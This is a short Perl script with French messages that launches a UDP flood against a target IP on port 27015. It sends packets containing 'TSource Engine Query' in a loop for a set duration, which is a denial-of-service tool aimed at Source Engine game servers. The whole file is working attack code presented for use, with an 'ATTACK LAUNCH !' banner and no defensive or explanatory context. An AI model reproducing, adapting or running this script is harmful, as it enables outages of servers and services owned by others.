#!/usr/bin/perl

use Socket;
use strict;

print "Utilisation : perl VSE_unspoofed.pl <IP> <TAILLE DES PAQUETS> <DUREE>\n\n";

my($ip, $size, $duration) = @ARGV;
my($target, $endTime, $pSize);

$target = inet_aton("$ip") or die "L'IP cible ( $ip ) n'est pas resolvable.\n";
$endTime = time() + ($duration ? $duration : 100);
$pSize = $size;

if($pSize > 1472)
{
    print "Taille des paquets superieure a 1472, les paquets seront donc pas fragmentes.\n";
}

if($pSize <= 1472)
{
    print "Taille des paquets inferieure ou egale e 1472, les paquets ne seront donc pas fragmentes.\n"
}

socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n\n\"The quieter you become, the more you are able to hear.\"\n\n\n";
print "ATTACK LAUNCH ! $ip" . ":27015" . ($size ? " // Taille paquets : $size" : " // ") . ($duration ? " // Duree : $duration secondes" : "") . "\n";
print "Arreter l'attaque avec Ctrl-C.\n" unless $duration;

for(;time() <= $endTime;)
{
    send(flood, pack("a$pSize", "TSource Engine Query"), 0, pack_sockaddr_in(27015, $target));
}